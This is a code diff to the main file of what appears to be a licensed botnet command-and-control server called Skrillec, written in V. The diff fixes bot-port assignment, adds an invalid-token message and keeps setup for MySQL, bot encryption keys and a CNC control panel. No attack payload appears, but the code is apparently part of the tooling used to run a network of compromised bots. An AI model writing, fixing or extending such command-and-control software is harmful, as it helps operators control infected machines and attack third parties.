@@ -25,6 +25,8 @@ import config
 import skrillec_cp
 
 fn main() {
+	// println(utils.gradient([255,0,0], [11,25,222], "testing gdfg"))
+	
 	//get mySQL info
 	mut info := config.get_db_info()
 	mut svr := server.Server{clients: &server.Clients{}, sqlconn: mysql.Connection{
@@ -44,7 +46,7 @@ fn main() {
 		if v == "-sqlpw" { svr.sqlconn.password = cmd_args[i+1] } // Setting MySQL PW
 		if v == "-t" { svr.cnc_key = cmd_args[i+1] } // Setting SKRILLEC License Key
 		if v == "-b_key" { svr.bot_encryption = cmd_args[i+1] } // Grab Bot Encryption Key (add a error handler down below)
-		if v == "-b_port" { svr.bot_port == cmd_args[i+1] } // Grab the bot port to host on (add a error handler down below)
+		if v == "-b_port" { svr.set_bot_port(cmd_args[i+1]) } // Grab the bot port to host on (add a error handler down below)
 
 		if v == "-reset_config" {
 			if cmd_args[i+1] == "MySQL" {
@@ -85,10 +87,12 @@ fn main() {
 
 	// License token validation
 	if server.validate_token(mut &svr) == 0 {
+		println("[x] Invalid token")
 		exit(0)
 	}
 	// Start Server In a Thread (Background)
 	go server.start_skrillec(mut &svr)
 	// Start the CNC CP to control the CNC from server/VPS!
 	skrillec_cp.main_cp()
+	
 } 
